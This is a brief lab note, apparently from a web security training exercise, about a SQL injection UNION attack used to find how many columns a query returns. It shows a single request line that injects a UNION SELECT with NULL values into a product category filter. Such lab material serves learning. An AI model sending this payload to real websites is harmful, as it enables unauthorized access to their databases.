# **UNION attack, determining the number of columns returned by the query**

Difficulty with this is I didn’t know which character to use in the column, I ended up using NULL

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL+--+- HTTP/2
```
